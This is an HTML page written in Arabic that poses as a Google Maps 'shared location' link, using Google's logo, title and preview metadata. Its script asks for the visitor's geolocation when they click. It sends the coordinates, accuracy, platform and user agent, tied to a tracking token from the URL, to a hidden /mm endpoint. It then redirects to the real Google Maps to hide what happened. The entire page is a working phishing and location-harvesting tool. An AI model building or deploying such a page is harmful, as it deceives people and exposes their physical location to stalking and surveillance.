<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Google Maps - الموقع المشترك">
    <meta property="og:description" content="تمت مشاركة موقع جغرافي معك. انقر لعرض الموقع على الخريطة.">
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
    <title>Google Maps</title>
    <style>
        body { font-family: Roboto, Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 320px; border: 1px solid #ddd; }
        .btn { display: inline-block; padding: 12px 24px; background-color: #1a73e8; color: white; border-radius: 4px; text-decoration: none; font-weight: bold; margin-top: 20px; cursor: pointer; border: none; width: 100%; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" width="64" alt="Maps">
        <h3>تمت مشاركة موقع معك</h3>
        <p>انقر على الزر أدناه لعرض الموقع الحالي على الخريطة.</p>
        <button class="btn" id="btn">عرض الموقع</button>
    </div>
    <script>
        const token = window.location.pathname.split('/').pop() || new URLSearchParams(window.location.search).get('t');
        document.getElementById('btn').onclick = function() {
            this.innerText = "جاري التحميل...";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/mm', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            token: token,
                            deviceInfo: {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                platform: navigator.platform,
                                userAgent: navigator.userAgent
                            }
                        })
                    }).then(() => {
                        window.location.href = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                    });
                }, err => {
                    alert("يرجى السماح بالوصول للموقع لعرض الخريطة.");
                    window.location.href = "https://www.google.com/maps";
                });
            } else {
                window.location.href = "https://www.google.com/maps";
            }
        };
    </script>
</body>
</html>
